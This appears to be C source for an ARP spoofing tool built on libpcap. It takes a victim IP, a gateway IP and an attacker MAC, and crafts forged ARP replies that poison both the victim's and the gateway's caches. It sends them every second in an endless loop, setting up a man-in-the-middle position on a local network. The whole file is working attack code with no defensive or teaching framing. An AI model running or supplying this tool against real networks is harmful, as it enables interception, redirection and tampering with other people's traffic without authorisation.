#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "arplib.h"
#include "pcap.h"

enum{
     ARGV_CMD,
    ARGV_TARGET_IP,
    ARGV_SPOOF_IP,
    ARGV_SPOOF_MAC
};

int main(int argc, char *argv[])
{
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *d;
    int no, i=0;

    struct arp_packet arp_packet,go_gw_arp_packet ;
    int arp_source_ip, arp_target_ip;
    int gw_arp_source_ip,gw_arp_target_ip;

    unsigned char buffer_mac[MAC_ADDRESS];
    unsigned char anymac[]={0xff,0xff,0xff,0xff,0xff,0xff,};
    unsigned char *arp_source_mac,*ether_source_mac,*ether_dest_mac;
    unsigned char *gw_arp_source_mac,*gw_ether_source_mac,*gw_ether_dest_mac;
    if(argc !=4){
        printf("Usage : %s [Target IP][IP][MAC]\n",argv[0]);
        return 1;
    }

    if(pcap_findalldevs(&alldevs,errbuf)<0){
        printf("pcap_findalldevs error\n");
        return 1;
    }
    for(d=alldevs;d;d=d->next){
        printf("%d : %s\n",++i,(d->description)?(d->description):(d->name));
    }

    printf("number : ");
    scanf("%d",&no);

    if(!(no>0 && no<=i)){
        printf("number error\n");
        return 1;
    }
    for(d=alldevs,i=0;d;d=d->next){
        if(no==++i) break;
    }

    if(!(adhandle=pcap_open_live(d->name,65536,1,1000,errbuf))){
        printf("pcap_open_live error %s\n",d->name);
        pcap_freealldevs(alldevs);
        return -1;
    }
    pcap_freealldevs(alldevs);

    arp_source_ip = inet_addr(argv[ARGV_SPOOF_IP]); // g.w ip
    arp_target_ip=inet_addr(argv[ARGV_TARGET_IP]); // target ip
    /* g.w poison */
    gw_arp_source_ip=inet_addr(argv[ARGV_TARGET_IP]); //victim ip
    gw_arp_target_ip=inet_addr(argv[ARGV_SPOOF_IP]);  //  g.w ip
    strmac_to_buffer(argv[ARGV_SPOOF_MAC],buffer_mac); //buffer_mac== my mac

    ether_dest_mac=anymac; // ff  brodcast
    ether_source_mac=arp_source_mac=buffer_mac;

    make_ether_header(&(arp_packet.ether_header),
                      ether_dest_mac,ether_source_mac,ETHERTYPE_ARP);

    make_arp_header(&(arp_packet.ether_arp),
                    arp_source_mac,arp_source_ip,NULL,arp_target_ip,1);

/* g.w poison make packet */
    make_ether_header(&(go_gw_arp_packet.ether_header),
                       ether_dest_mac,ether_source_mac,ETHERTYPE_ARP);


    make_arp_header(&(go_gw_arp_packet.ether_arp),
                    arp_source_mac,gw_arp_source_ip,NULL,gw_arp_target_ip,1);

    while(1){
        pcap_sendpacket(
            adhandle,(unsigned char *)&arp_packet,sizeof(arp_packet));

        pcap_sendpacket(
            adhandle,(unsigned char *)&go_gw_arp_packet,sizeof(go_gw_arp_packet));

        sleep(1);
        }

    pcap_close(adhandle);

    return 0;
}

